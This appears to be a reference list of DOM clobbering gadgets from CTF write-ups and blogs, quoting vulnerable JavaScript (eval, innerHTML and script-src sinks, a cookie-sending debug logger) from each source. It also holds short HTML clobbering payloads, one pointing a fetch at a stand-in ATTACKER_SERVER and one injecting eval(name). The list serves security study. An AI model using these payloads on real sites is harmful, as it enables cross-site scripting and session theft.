## Existing DOM Clobbering Gadgets


### Github


### Blogs from Google

https://research.securitum.com/xss-in-amp4email-dom-clobbering/
https://blog.huli.tw/2021/01/23/en/dom-clobbering/
```
var script = window.document.createElement("script");
script.async = false;

var loc;
if (AMP_MODE.test && window.testLocation) {
    loc = window.testLocation
} else {
    loc = window.location;
}

if (AMP_MODE.localDev) {
    loc = loc.protocol + "//" + loc.host + "/dist"
} else {
    loc = "https://cdn.ampproject.org";
}

var singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + "/" : "";
b.src = loc + "/rtv/" + AMP_MODE.rtvVersion; + "/" + singlePass + "v0/" + pluginName + ".js";

document.head.appendChild(b);
```

+ https://lebr0nli.github.io/blog/security/fwordCTF2021/#shisui-web
```
window.SETTINGS = window.SETTINGS || [{
  dataset:{
    "timezone":"",
    "location":"Tunisia"
  },
  Title:"FwordFeedbacks",
  check: false	
}]
function looseJsonParse(obj){
  if(obj.length<35){  
	return eval("(" + obj + ")");
  }else{
    return {location:"Limit Length Exceeded"}
  }
}
function addInfos(){
	if(window.showInfos && SETTINGS.check  && SETTINGS[0].dataset.timezone.length>2){
        var infos=`{location:${SETTINGS[0].dataset.location}}`;
	var result=document.createElement("p");
	result.textContent=`Location: ${looseJsonParse(infos).location} Timezone: UTC+1` ;
	document.getElementById("out").appendChild(result);
	console.log(result);
	}
}
addInfos()
```
```
<a id=SETTINGS data-timezone=aaa data-location=eval(name)></a>
<a id=SETTINGS name=check></a>
<a id=showInfos></a>
```

+ https://ctftime.org/writeup/37463
```
async function loadBody() {
    let extension = null;
    if (window.debug?.extension) {
        let res = await fetch(window.debug?.extension.toString());
        extension = await res.json();
    }
```
```
<a id="debug"></a><a id="debug" name="extension" href="//ATTACKER_SERVER"></a>
```


+ https://wizer-ctf.com/writeups/ctf14.html
```
export default function Home() {
  const router = useRouter();
  const { yourName, yourAvatar, transferTo, pointsToTransfer } = router.query;
  const isNameProvided = typeof yourName === 'string' && yourName.length > 0;
  React.useEffect(() => {
    if (router.isReady && isNameProvided) {
      // Sanitize your name and avatar image
      const name = DOMPurify.sanitize(yourName);
      const avatar = yourAvatar ? DOMPurify.sanitize(String(yourAvatar)) : '<img src="/favicon.png" width="20px">';
      document.getElementById('name').innerText = name;
      document.getElementById('avatar').innerHTML = avatar;
      if(window.transferBalance && transferTo && pointsToTransfer) {
        var formData = JSON.stringify(router.query.serializeArray());
        const response = $.ajax({type: "POST", url: '../api/transferPoints', async: false,
          data: formData, success: function(){}, dataType: 'json',
          contentType : 'application/json'})
        if(response.status === 200) { alert(`${name}, you’ve successfully transfered ${pointsToTransfer} + 
        points to account ID ${transferTo}`); }
        else { $("#error").text(decodeURIComponent(response.responseText)); }
      }
    }
  }, [router.isReady, isNameProvided]);

  return (
    <main className="text-center mt-5">
      <h6>
        <span id="avatar"></span>&nbsp;
        <span>Hello <span id="name"></span> what would you want to do next?</span>
      </h6>
      <h3 className="h3 mb-3 fw-normal">Points management</h3>
      <h5 className="h5 mb-2 fw-normal" style={{cursor: 'pointer'}}
        onClick={() => { router.push('/transfer')}}>Transfer Points</h5>
      <h5 className="h5 mb-2 fw-normal" style={{cursor: 'pointer'}}
        onClick={() => { router.push('/buy')}}>Buy points</h5>
      <h5 className="h5 mb-2 fw-normal" style={{cursor: 'pointer'}}
        onClick={() => { router.push('/trends')}}>Points spending trends</h5>
      <div className={styles.footer}>
        Powered by <Image src="/wizer.svg"
          alt="Wizer"
          width={200}
          height={100}
          className={styles.logo} />
      </div>
    </main>
  )
}
```


+ https://github.com/aszx87410/ctf-writeups/issues/55
```
function reloadRecaptchaScript(index) {
  // delay for a bit to not block main thread
  setTimeout(() => {
    console.log('reload', index, document.scripts[index])
    const element = document.scripts[index]
    const src = element.getAttribute('src')
    if (!src.startsWith('https://www.google.com/recaptcha/')) {
      throw new Error('reload failed, invalid src')
    }
    element.parentNode.removeChild(element)
    loadScript(src)
  }, 1000)
}
```

+ https://gist.github.com/terjanq/e2198440c4fdfbdec43e921b600d4a1d#recaptcha-for-the-rescue
+ https://ctftime.org/writeup/23580
```
function writeOutput() {
  if (statusCode !== 3) {
    if (CONFIG.unsafeRender) {
      document.getElementById('output').innerHTML = output;
    } else {
      document.getElementById('output').innerText = output;
    }
  }
}
```

+ https://ctftime.org/writeup/32719
```
window.onload = () => {
    const imgSrc = document.getElementById('user-image').src
    document.getElementById('user-image-info').innerText = imgSrc

    if (DEBUG_MODE) {
        // In debug mode, send the image url to our debug endpoint for logging purposes.
        // We'd normally use fetch() but our CSP won't allow that so use an <img> instead.
        document.getElementById('body').insertAdjacentHTML('beforeend', `<img src="${DEBUG_LOGGING_URL}?auth=${btoa(document.cookie)}&image=${btoa(imgSrc)}">`)
    }
}
```

+ https://ctftime.org/writeup/26317
```
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Simple Blog</title>
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; object-src 'none'; base-uri 'none'; script-src 'nonce-DZ5mzla/D4n5wZNlTB5qQwurzU4=' 'strict-dynamic'; require-trusted-types-for 'script'; trusted-types default">
    <link rel="stylesheet" href="/css/bootstrap-foo.min.css">
    <link rel="stylesheet" href="/css/style.css">
  </head>
  <body>
    <div class="container">
      <nav class="navbar navbar-expand-lg navbar-foo bg-foo">
        <a class="navbar-brand" href="/">Simple Blog</a>
        <ul class="navbar-nav mr-auto">
          <li class="nav-item"><a class="nav-link" href="/report.php">Report Vulnerability</a></li>
        </ul>
        <ul class="navbar-nav">
          <li class="nav-item"><a class="nav-link" href="/?theme=dark">Toggle theme</a></li>
        </ul>
      </nav>
    </div>
    <main class="container" id="main">
      <div class="spinner-border" id="loading">
        <span class="sr-only">Loading...</span>
      </div>
    </main>
    <script src="/js/trustedtypes.build.js" nonce="DZ5mzla/D4n5wZNlTB5qQwurzU4=" data-csp="require-trusted-types-for 'script'; trusted-types default"></script>
    <script nonce="DZ5mzla/D4n5wZNlTB5qQwurzU4=">
    // JSONP
    const jsonp = (url, callback) => {
      const s = document.createElement('script');

      if (callback) {
        s.src = `${url}?callback=${callback}`;
      } else {
        s.src = url;
      }

      document.body.appendChild(s);
    };

    // render articles
    const render = articles => {
      const main = document.getElementById('main');
      const loading = document.getElementById('loading');

      articles.sort((a, b) => a.id - b.id);
      for (const article of articles) {
        const elm = document.createElement('article');
        elm.classList.add('blog-post');

        const title = document.createElement('h2');
        title.innerHTML = article.title;
        elm.appendChild(title);

        const content = document.createElement('p');
        content.innerHTML = article.content;
        elm.appendChild(content);

        main.appendChild(elm);
      }

      loading.remove();
    };

    // initialize blog
    const init = () => {
      // try to register trusted types
      try {
        trustedTypes.createPolicy('default', {
          createHTML(url) {
            return url.replace(/[<>]/g, '');
          },
          createScriptURL(url) {
            if (url.includes('callback')) {
              throw new Error('custom callback is unimplemented');
            }

            return url;
          }
        });
      } catch {
        if (!trustedTypes.defaultPolicy) {
          throw new Error('failed to register default policy');
        }
      }

      // TODO: implement custom callback
      jsonp('/api.php', window.callback);
    };

    init();
    </script>
  </body>
</html>
```

+ https://web.archive.org/web/20220524204523/https://blog.bi0s.in/2021/08/30/Web/Fword-CTF-2021-Shisui-Write-up/
```
window.SETTINGS = window.SETTINGS || [{
  dataset:{
    "timezone":"",
    "location":"Tunisia"
  },
  Title:"FwordFeedbacks",
  check: false	
}]
function looseJsonParse(obj){
  if(obj.length<35){  
	return eval("(" + obj + ")");
  }else{
    return {location:"Limit Length Exceeded"}
  }
}
function addInfos(){
	if(window.showInfos && SETTINGS.check  && SETTINGS[0].dataset.timezone.length>2){
        var infos=`{location:${SETTINGS[0].dataset.location}}`;
	var result=document.createElement("p");
	result.textContent=`Location: ${looseJsonParse(infos).location} Timezone: UTC+1` ;
	document.getElementById("out").appendChild(result);
	console.log(result);
	}
}
addInfos()
```

+ https://github.com/aszx87410/ctf-writeups/issues/21
```
const jsonp = (url, callback) => {
  const s = document.createElement('script');

  if (callback) {
    s.src = `${url}?callback=${callback}`;
  } else {
    s.src = url;
  }

  document.body.appendChild(s);
};

const init = () => {
  // try to register trusted types
  try {
    trustedTypes.createPolicy('default', {
      createHTML(url) {
        return url.replace(/[<>]/g, '');
      },
      createScriptURL(url) {
        if (url.includes('callback')) {
          throw new Error('custom callback is unimplemented');
        }

        return url;
      }
    });
  } catch {
    if (!trustedTypes.defaultPolicy) {
      throw new Error('failed to register default policy');
    }
  }

  // TODO: implement custom callback
  jsonp('/api.php', window.callback);
};

init();
```
